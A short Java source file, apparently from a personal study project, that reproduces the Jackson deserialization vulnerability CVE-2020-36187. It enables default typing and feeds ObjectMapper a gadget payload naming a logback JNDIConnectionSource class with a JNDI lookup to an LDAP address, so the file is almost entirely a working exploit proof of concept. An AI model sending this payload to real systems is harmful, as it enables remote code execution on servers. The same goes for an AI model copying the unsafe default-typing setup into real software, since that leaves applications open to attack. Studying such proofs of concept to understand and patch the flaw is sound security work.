package jackson;

/**
 * @BelongsProject: study_java
 * @BelongsPackage: jackson
 * @Author: Clown
 * @CreateTime: 2023-10-24  22:03
 */
import com.fasterxml.jackson.databind.ObjectMapper;

import java.io.IOException;

public class CVE_2020_36187 {
    public static void main(String[] args) throws IOException {
        ObjectMapper mapper = new ObjectMapper();
        mapper.enableDefaultTyping();
        String payload = "[\"com.newrelic.agent.deps.ch.qos.logback.core.db.JNDIConnectionSource\",{\"jndiLocation\":\"ldap://127.0.0.1:9090/T\"}]";
        Object o = mapper.readValue(payload, Object.class);
        mapper.writeValueAsString(o);
    }
}
